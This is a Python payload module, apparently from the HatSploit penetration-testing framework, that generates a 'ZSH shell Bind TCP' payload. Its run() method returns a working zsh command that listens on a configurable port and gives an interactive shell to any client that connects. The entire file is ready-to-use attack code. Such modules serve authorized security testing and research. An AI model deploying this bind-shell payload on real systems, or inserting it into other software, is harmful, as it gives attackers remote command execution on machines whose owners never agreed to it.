"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "ZSH shell Bind TCP",
            'Payload': "unix/generic/zsh_bind_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "ZSH shell bind TCP payload.",
            'Architecture': "generic",
            'Platform': "unix",
            'Rank': "high",
            'Type': "bind_tcp",
            'Actions': ['phaseless']
        }

    def run(self):
        bind_port = self.handler['BPORT']

        payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp -l {bind_port} && ztcp -a $REPLY && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
        return payload
